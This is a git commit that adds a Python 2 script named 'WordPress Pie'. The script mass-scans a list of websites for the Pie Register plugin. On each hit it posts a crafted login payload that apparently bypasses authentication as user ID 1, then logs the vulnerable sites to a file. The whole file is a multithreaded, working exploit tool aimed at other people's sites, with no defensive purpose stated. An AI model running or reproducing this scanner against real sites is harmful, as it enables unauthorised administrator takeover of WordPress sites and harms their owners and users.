f66f3e8e9c184e24204ad0adfaaff03c6208c325
bintang4 <43073401+bintang4@users.noreply.github.com>
2022-11-23 00:06:52 +0700

    Add files via upload

---
+++ cl2.py
@@ -0,0 +1,124 @@
+# -*- coding: utf-8 -*-
+import requests,socket
+requests.packages.urllib3.disable_warnings()
+from threading import *
+from threading import Thread
+from ConfigParser import ConfigParser
+from Queue import Queue
+
+class Worker(Thread):
+    def __init__(self, tasks):
+        Thread.__init__(self)
+        self.tasks = tasks
+        self.daemon = True
+        self.start()
+
+    def run(self):
+        while True:
+            func, args, kargs = self.tasks.get()
+            try: func(*args, **kargs)
+            except Exception, e: print e
+            self.tasks.task_done()
+
+class ThreadPool:
+    def __init__(self, num_threads):
+        self.tasks = Queue(num_threads)
+        for _ in range(num_threads): Worker(self.tasks)
+
+    def add_task(self, func, *args, **kargs):
+        self.tasks.put((func, args, kargs))
+
+    def wait_completion(self):
+        self.tasks.join()
+
+def main(url):
+ if "://" in url:
+      url = url
+ else:
+	  url = "http://"+url
+ if url.endswith('/'):
+	  url = url[:-1]
+ try:
+		headers = {'User-Agent':'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0'}
+		get_sole = requests.get(url,headers=headers, timeout=8, verify=False, allow_redirects=False).text
+		if "pie-register" in get_sole or "pie_notice_" in get_sole:
+		    coy = requests.session()
+		    payload = {'user_id_social_site': '1','social_site': 'true','_wp_http_referer':'/login/','log': 'null','pwd':'null'}
+		    cok = coy.post(url, headers=headers, data=payload, allow_redirects=False, verify=False, timeout=8)
+		    #print(cok)
+		    if cok.status_code == 302:
+		        print('\033[92m'+url+'\033[00m')
+		        se = open('pie-register.txt', 'a')
+		        se.write(url+'\n')
+		        se.close() 
+		    else:
+		        print('\033[91m'+url+'\033[00m')
+		else:
+		 print('\033[91m'+url+'\033[00m')
+ except:
+		pass
+
+if __name__ == '__main__':
+    print('''
+    WordPress Pie
+     \n''')
+    try:
+        pid_restore = ".pid_restore"
+        readcfg = ConfigParser()
+        readcfg.read(pid_restore)
+        lists = readcfg.get('DB', 'FILES')
+        numthread = readcfg.get('DB', 'THREAD')
+        sessi = readcfg.get('DB', 'SESSION')
+        print("log session bot found! restore session")
+        print('''Using Configuration :\n\tFILES='''+lists+'''\n\tTHREAD='''+numthread+'''\n\tSESSION='''+sessi)
+        tanya = raw_input("Want to contineu session ? [Y/n] ")
+        if "Y" in tanya or "y" in tanya:
+            lerr = open(lists).read().split("\n"+sessi)[1]
+            readsplit = lerr.splitlines()
+        else:
+            kntl # Send Error Biar Lanjut Ke Wxception :v
+    except:
+        try:
+            lists = sys.argv[1]
+            numthread = sys.argv[2]
+            readsplit = open(lists).read().splitlines()
+        except:
+            try:
+                lists = raw_input("websitelist ? ")
+                readsplit = open(lists).read().splitlines()
+            except:
+                print("Wrong input or list not found!")
+                exit()
+            try:
+                numthread = raw_input("threads? : ")
+            except:
+                print("Wrong thread number!")
+                exit()
+    pool = ThreadPool(int(numthread))
+    
+    for url in readsplit:
+        
+        if "://" in url:
+            url = url
+        else:
+            url = "http://"+url
+        if url.endswith('/'):
+            url = url[:-1]
+        jagases = url
+        try:
+            pool.add_task(main, url)
+        except KeyboardInterrupt:
+            session = open(pid_restore, 'w')
+            cfgsession = "[DB]\nFILES="+lists+"\nTHREAD="+str(numthread)+"\nSESSION="+jagases+"\n"
+            session.write(cfgsession)
+            session.close()
+            print("CTRL+C Detect, Session saved")
+            exit()
+    pool.wait_completion()
+    try:
+        os.remove(pid_restore)
+    except:
+        pass
+
+
+
